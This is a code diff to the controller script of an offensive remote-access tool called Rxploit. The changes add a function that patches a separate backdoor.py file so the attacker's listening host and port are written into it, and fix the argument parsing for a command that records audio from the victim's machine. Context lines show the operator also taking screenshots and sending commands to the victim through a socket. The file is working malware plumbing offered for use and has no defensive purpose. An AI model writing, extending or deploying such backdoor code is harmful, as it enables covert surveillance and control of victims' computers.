@@ -1,7 +1,9 @@
 import argparse
+import fileinput
 import json
 import os
 import socket
+import sys
 
 import termcolor
 
@@ -14,15 +16,23 @@ _github = "https://github.com/JosephFrankFir/Rxploit"
 ap = argparse.ArgumentParser()
 ap.add_argument("-rh", "--rhost", required=True, help="Victim ip")
 ap.add_argument("-p", "--port", required=True, help="Port")
-# ap.add_argument("-lh", "--lhost", required=True, help="Your local ip")
+ap.add_argument("-lh", "--lhost", required=True, help="Your local ip")
 args = vars(ap.parse_args())
 
-# if args['lhost']:
-#     LHOST = str(args['lhost'])
+if args['lhost']:
+    LHOST = str(args['lhost'])
 if args['rhost']:
     RHOST = str(args['rhost'])
 if args['port']:
     PORT = int(args['port'])
+
+
+def modify_backdoor():
+    file = open('backdoor.py')
+    _content = file.readlines()
+    for i, line in enumerate(fileinput.input('backdoor.py', inplace=1)):
+        sys.stdout.write(line.replace(_content[15], f'LHOST = "{LHOST}";PORT = {PORT}'))
+    print(termcolor.colored("[+] Modifying backdoor file", 'green'))
 
 
 def reliable_send(data):
@@ -117,7 +127,7 @@ def target_reqs():
           print(termcolor.colored('[+] Done screenshot saved', 'green'))
       elif cmd[:6] == 'record':
           f = open('recorded%d.wav' % (count), 'wb')
-          _timeout = cmd[7:] + 7
+          _timeout = int(cmd[7:]) + 7
           target.settimeout(_timeout)
           chunk = target.recv(1024)
           while chunk:
@@ -179,6 +189,8 @@ def target_reqs():
          result = reliable_recv()
          print(result)
 
+
+modify_backdoor()
 skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 skt.bind((RHOST, PORT))
 print(termcolor.colored("[+] Listening for incoming requests", "green"))
